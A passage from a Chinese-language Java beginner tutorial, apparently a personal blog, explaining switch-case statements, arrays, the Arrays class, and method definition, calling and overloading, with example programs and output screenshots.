class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">    <span class="keyword">case</span> value :</span><br><span class="line">       <span class="comment">//语句</span></span><br><span class="line">       <span class="keyword">break</span>; <span class="comment">//可选</span></span><br><span class="line">    <span class="keyword">case</span> value :</span><br><span class="line">       <span class="comment">//语句</span></span><br><span class="line">       <span class="keyword">break</span>; <span class="comment">//可选</span></span><br><span class="line">    <span class="comment">//你可以有任意数量的case语句</span></span><br><span class="line">    <span class="keyword">default</span> : <span class="comment">//可选</span></span><br><span class="line">       <span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>switch case 执行时，一定会先进行匹配，匹配成功返回当前 case 的值，再根据是否有 break，判断是否继续输出，或是跳出判断。</strong></p><p>switch case 语句有如下规则：</p><ul><li>switch 语句中的变量类型可以是： byte、short、int 或者 char。从 Java SE 7 开始，switch 支持字符串 String 类型了，同时 case 标签必须为字符串常量或字面量。</li><li>switch 语句可以拥有多个 case 语句。<strong>每个 case 后面跟一个要比较的值和冒号</strong>。</li><li>case 语句中的值的数据类型必须与变量的数据类型相同，而且只能是常量或者字面常量。</li><li>当变量的值与 case 语句的值相等时，那么 case 语句之后的语句开始执行，直到 break 语句出现才会跳出 switch 语句。</li><li><strong>当遇到 break 语句时，switch 语句终止。程序跳转到 switch 语句后面的语句执行</strong>。case 语句不必须要包含 break 语句。如果没有 break 语句出现，程序会继续执行下一条 case 语句，直到出现 break 语句。</li><li>switch 语句可以包含一个 default 分支，该分支一般是 switch 语句的最后一个分支（可以在任何位置，但建议在最后一个）。<strong>default 在没有 case 语句的值和变量值相等的时候执行</strong>。default 分支不需要 break 语句。</li></ul><p><strong>实例A：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> grade;</span><br><span class="line">        grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">        System.out.print(grade + <span class="string">&quot;等级属于&quot;</span>);</span><br><span class="line">        <span class="keyword">switch</span>(grade)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span> :</span><br><span class="line">                System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span> :</span><br><span class="line">                System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> :</span><br><span class="line">                System.out.println(<span class="string">&quot;需要努力了啊！&quot;</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;未知等级&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510224226.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510224334.png"></p><p><strong>实例B</strong></p><p>如果当前匹配成功的 case 语句块没有 break 语句，则从当前 case 开始，后续所有 case 的值都会输出，如果后续的 case 语句块有 break 语句则会跳出判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">switch</span>(i)&#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">         <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">         <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">            System.out.println(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510225140.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510225222.png"></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="声明数组变量"><a href="#声明数组变量" class="headerlink" title="声明数组变量"></a>声明数组变量</h2><p>首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar;   <span class="comment">// 首选的方法</span></span><br><span class="line"> </span><br><span class="line">或</span><br><span class="line"> </span><br><span class="line">dataType arrayRefVar[];  <span class="comment">// 效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 建议使用 <strong>dataType[] arrayRefVar</strong> 的声明风格声明数组变量。 dataType arrayRefVar[] 风格是来自 C/C++ 语言 ，在Java中采用是为了让 C/C++ 程序员能够快速理解java语言。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span>[] myList;         <span class="comment">// 首选的方法</span></span><br><span class="line"> </span><br><span class="line">或</span><br><span class="line"> </span><br><span class="line"><span class="keyword">double</span> myList[];         <span class="comment">//  效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure><h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><p>使用new操作符来创建数组，语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayRefVar = <span class="keyword">new</span> dataType[arraySize];</span><br></pre></td></tr></table></figure><p>上面的语法语句做了两件事：</p><ul><li>一、使用 dataType[arraySize] 创建了一个数组。</li><li>二、把新创建的数组的引用赋值给变量 arrayRefVar。</li></ul><p>数组变量的声明，和创建数组可以用一条语句完成，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar = <span class="keyword">new</span> dataType[arraySize];</span><br><span class="line">或</span><br><span class="line">dataType[] arrayRefVar = &#123;value0, value1, ..., valuek&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：数组的元素是通过索引访问的。数组索引从 0 开始，所以索引值从 0 到 arrayRefVar.length-1。</p><p><strong>实例A：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> arraySize = <span class="number">5</span> ;</span><br><span class="line">        <span class="keyword">int</span>[] arr;             <span class="comment">//声明数组</span></span><br><span class="line">        arr = <span class="keyword">new</span> <span class="keyword">int</span>[arraySize]; <span class="comment">//创建数组    4，5也可写作int[] arr = new int[arraySize];</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">72</span>;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">28</span>;            <span class="comment">//直接给数组赋值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; arraySize; i++)&#123;      <span class="comment">//通过for循环给数组赋值</span></span><br><span class="line">            arr[i] = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;数组元素为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arraySize; i++ )&#123;</span><br><span class="line">            System.out.print(arr[i]);</span><br><span class="line">            System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arraySize; i++ )&#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;该数组所有元素之和为：&quot;</span> + sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510231755.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510231831.png"></p><p><strong>实例B</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span>[] myList = &#123;<span class="number">2.3</span>, <span class="number">1.7</span>, <span class="number">1.6</span>, <span class="number">3.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输出myList数组</span></span><br><span class="line">        System.out.print(<span class="string">&quot;该数组中的元素有：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; myList.length; i++)&#123;</span><br><span class="line">            System.out.print(myList[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//查找最大值——令第一个数组元素为默认的max，向后挨个比较大小。</span></span><br><span class="line">        <span class="keyword">double</span> max = myList[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; myList.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(max &lt; myList[i]) max = myList[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;该数组中最大值为：&quot;</span> + max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510233554.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510233615.png"></p><h2 id="For-Each-循环"><a href="#For-Each-循环" class="headerlink" title="For-Each 循环"></a>For-Each 循环</h2><p>JDK 1.5 引进了一种新的循环类型，被称为 For-Each 循环或者加强型循环，<strong>它能在不使用下标的情况下遍历数组。</strong></p><p>语法格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(type element: array)</span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**PS:**注意输出的格式是<code>(element)</code></p><p><strong>实例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span>[] myList = &#123;<span class="number">2.3</span>, <span class="number">1.7</span>, <span class="number">1.6</span>, <span class="number">3.5</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">double</span> element: myList)&#123;</span><br><span class="line">            System.out.println(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510234345.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230510234424.png"></p><h2 id="数组作为函数的参数"><a href="#数组作为函数的参数" class="headerlink" title="数组作为函数的参数"></a>数组作为函数的参数</h2><p>数组可以作为参数传递给方法。</p><p>例如，下面的例子就是一个打印 int 数组中元素的方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">    System.out.print(array[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面例子调用 printArray 方法打印出 3，1，2，6，4 和 2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printArray(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>&#125;);</span><br></pre></td></tr></table></figure><h2 id="数组作为函数的返回值"><a href="#数组作为函数的返回值" class="headerlink" title="数组作为函数的返回值"></a>数组作为函数的返回值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] reverse(<span class="keyword">int</span>[] list) &#123;</span><br><span class="line">  <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[list.length];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = result.length - <span class="number">1</span>; i &lt; list.length; i++, j--) &#123;</span><br><span class="line">    result[j] = list[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 result 数组作为函数的返回值。</p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>多维数组可以看成是数组的数组，比如二维数组就是一个特殊的一维数组，其每一个元素都是一个一维数组，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[][] str = <span class="keyword">new</span> String[<span class="number">3</span>][<span class="number">4</span>];</span><br></pre></td></tr></table></figure><h3 id="多维数组的动态初始化（以二维数组为例）"><a href="#多维数组的动态初始化（以二维数组为例）" class="headerlink" title="多维数组的动态初始化（以二维数组为例）"></a>多维数组的动态初始化（以二维数组为例）</h3><ol><li><strong>直接为每一维分配空间</strong>，格式如下：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type[][] typeName = <span class="keyword">new</span> type[typeLength1][typeLength2];</span><br><span class="line">                            <span class="comment">//行              列</span></span><br></pre></td></tr></table></figure><p>type 可以为基本数据类型和复合数据类型，typeLength1 和 typeLength2 必须为正整数，<strong>typeLength1 为行数，typeLength2 为列数。</strong></p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">3</span>];    <span class="comment">//两行三列。</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>从最高维开始，分别为每一维分配空间</strong>，例如：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String[][] s = <span class="keyword">new</span> String[<span class="number">2</span>][];</span><br><span class="line">s[<span class="number">0</span>] = <span class="keyword">new</span> String[<span class="number">2</span>];   <span class="comment">//s的第一行的列数为2</span></span><br><span class="line">s[<span class="number">1</span>] = <span class="keyword">new</span> String[<span class="number">3</span>];   <span class="comment">//s的第二行的列数为3</span></span><br><span class="line">s[<span class="number">0</span>][<span class="number">0</span>] = <span class="keyword">new</span> String(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">s[<span class="number">0</span>][<span class="number">1</span>] = <span class="keyword">new</span> String(<span class="string">&quot;Luck&quot;</span>);</span><br><span class="line">s[<span class="number">1</span>][<span class="number">0</span>] = <span class="keyword">new</span> String(<span class="string">&quot;to&quot;</span>);</span><br><span class="line">s[<span class="number">1</span>][<span class="number">1</span>] = <span class="keyword">new</span> String(<span class="string">&quot;you&quot;</span>);</span><br><span class="line">s[<span class="number">1</span>][<span class="number">2</span>] = <span class="keyword">new</span> String(<span class="string">&quot;!&quot;</span>);</span><br></pre></td></tr></table></figure><p>解析：</p><p><strong>s[0]=new String[2]</strong> 和 <strong>s[1]=new String[3]</strong> 是为最高维分配引用空间，也就是为最高维限制其能保存数据的最长的长度，然后再为其每个数组元素单独分配空间 <strong>s0=new String(“Good”)</strong> 等操作。</p><h3 id="多维数组的引用（以二维数组为例）"><a href="#多维数组的引用（以二维数组为例）" class="headerlink" title="多维数组的引用（以二维数组为例）"></a>多维数组的引用（以二维数组为例）</h3><p>对二维数组中的每个元素，引用方式为 <code>arrayName[index1][index2]</code>，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[<span class="number">1</span>][<span class="number">0</span>];</span><br></pre></td></tr></table></figure><h2 id="Arrays-类"><a href="#Arrays-类" class="headerlink" title="Arrays 类"></a>Arrays 类</h2><p><code>java.util.Arrays</code> 类能方便地操作数组，它提供的所有方法都是静态的。</p><p>具有以下功能：</p><ul><li>给数组赋值：通过 fill 方法。</li><li>对数组排序：通过 sort 方法,按升序。</li><li>比较数组：通过 equals 方法比较数组中元素值是否相等。</li><li>查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</li></ul><table><thead><tr><th align="left">序号</th><th align="left">方法和说明</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public static int binarySearch(Object[] a, Object key)</strong> 用二分查找算法在给定数组中搜索给定值的对象(Byte,Int,double等)。数组在调用前必须排序好的。如果查找值包含在数组中，则返回搜索键的索引；否则返回 (-(<em>插入点</em>) - 1)。</td></tr><tr><td align="left">2</td><td align="left"><strong>public static boolean equals(long[] a, long[] a2)</strong> 如果两个指定的 long 型数组彼此<em>相等</em>，则返回 true。如果两个数组包含相同数量的元素，并且两个数组中的所有相应元素对都是相等的，则认为这两个数组是相等的。换句话说，如果两个数组以相同顺序包含相同的元素，则两个数组是相等的。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。</td></tr><tr><td align="left">3</td><td align="left"><strong>public static void fill(int[] a, int val)</strong> 将指定的 int 值分配给指定 int 型数组指定范围中的每个元素。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。</td></tr><tr><td align="left">4</td><td align="left"><strong>public static void sort(Object[] a)</strong> 对指定对象数组根据其元素的自然顺序进行升序排列。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。</td></tr></tbody></table><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>Java方法是语句的集合，它们在一起执行一个功能。</p><ul><li>方法是解决一类问题的步骤的有序组合</li><li>方法包含于类或对象中</li><li>方法在程序中被创建，在其他地方被引用</li></ul><p><strong>方法的优点</strong></p><ul><li><ol><li>使程序变得更简短而清晰。</li></ol></li><li><ol start="2"><li>有利于程序维护。</li></ol></li><li><ol start="3"><li>可以提高程序开发的效率。</li></ol></li><li><ol start="4"><li>提高了代码的重用性。</li></ol></li></ul><p><strong>方法的命名规则</strong></p><ul><li>1.方法的名字的第一个单词应以<strong>小写字母作为开头</strong>，后面的单词则用大写字母开头写，不使用连接符。例如：<strong>addPerson</strong>。</li><li>2.下划线<code>_</code>可能出现在 JUnit 测试方法名称中用以分隔名称的逻辑组件。一个典型的模式是：<code>test&lt;MethodUnderTest&gt;_&lt;state&gt;</code>，例如 <code>testPop_emptyStack</code>。</li></ul><h2 id="方法的定义"><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h2><p>一般情况下，定义一个方法包含以下语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型 参数名)&#123;</span><br><span class="line">    ...</span><br><span class="line">    方法体</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法包含一个方法头和一个方法体。下面是一个方法的所有部分：</p><ul><li><strong>修饰符：</strong>修饰符，这是<strong>可选的</strong>，告诉编译器如何调用该方法。定义了该方法的访问类型。如：<code>default, public , protected, private, final, abstract, static, synchronized</code></li><li><strong>返回值类型 ：</strong>方法可能会返回值。returnValueType 是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下，returnValueType 是关键字<strong>void</strong>。</li><li><strong>方法名：</strong>是方法的实际名称。方法名和参数表共同构成方法签名。</li><li><strong>参数类型：</strong>参数像是一个占位符。当方法被调用时，传递值给参数。这个值被称为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。参数是可选的，方法可以不包含任何参数。</li><li><strong>方法体：</strong>方法体包含具体的语句，定义该方法的功能。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513121232.png"></p><p>注意： 在一些其它语言中方法指过程和函数。一个返回非void类型返回值的方法称为函数；一个返回void类型返回值的方法叫做过程。</p><h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><p>Java 支持两种调用方法的方式，根据方法是否返回值来选择。</p><p>当程序调用一个方法时，程序的控制权交给了被调用的方法。当被调用方法的返回语句执行或者到达方法体闭括号时候交还控制权给程序。</p><p>当方法返回一个值的时候，方法调用通常被当做一个值。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> larger = max(<span class="number">30</span>, <span class="number">40</span>);</span><br></pre></td></tr></table></figure><p>如果方法返回值是void，方法调用一定是一条语句。例如，方法println返回void。下面的调用是个语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;欢迎访问Sigma的博客！&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><p>下面的例子演示了如何定义一个方法，以及如何调用它。</p><p>这个程序包含 main 方法和 max 方法。main 方法是被 JVM 调用的，除此之外，main 方法和其它方法没什么区别。</p><p>main 方法的头部是不变的，如例子所示，带修饰符 public 和 static,返回 void 类型值，方法名字是 main,此外带个一个 String[] 类型参数。String[] 表明参数是字符串数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="comment">/** 主方法 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number1 = <span class="number">17</span>;</span><br><span class="line">        <span class="keyword">int</span> number2 = <span class="number">65</span>;</span><br><span class="line">        <span class="keyword">int</span> maximum = max(number1, number2);</span><br><span class="line">        System.out.println(number1 + <span class="string">&quot;和&quot;</span> + number2 + <span class="string">&quot;相比较，&quot;</span> + maximum + <span class="string">&quot;更大&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 返回两个整数变量较大的值 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num1 &gt; num2 ? num1 : num2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513124211.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513124256.png"></p><h2 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h2><p>上面使用的max方法仅仅适用于int型数据。但如果要得到两个浮点类型数据的最大值呢？</p><p>解决方法是创建另一个有相同名字但参数不同的方法，如下面代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">max</span><span class="params">(<span class="keyword">double</span> num1, <span class="keyword">double</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 &gt; num2 ? num1 : num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你调用max方法时传递的是int型参数，则 int型参数的max方法就会被调用；</p><p>如果传递的是double型参数，则double类型的max方法体会被调用，这叫做方法重载；</p><p>就是说<strong>一个类的两个方法拥有相同的名字，但是有不同的参数列表</strong>。</p><p>Java编译器根据方法签名判断哪个方法应该被调用。</p><p>方法重载可以让程序更清晰易读。执行密切相关任务的方法应该使用相同的名字。</p><p><strong>重载的方法必须拥有不同的参数列表</strong>。不能仅仅依据修饰符或者返回类型的不同来重载方法。</p><h2 id="void-关键字"><a href="#void-关键字" class="headerlink" title="void 关键字"></a>void 关键字</h2><p>下面的例子声明了一个名为 printGrade 的方法，并且调用它来打印给定的分数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 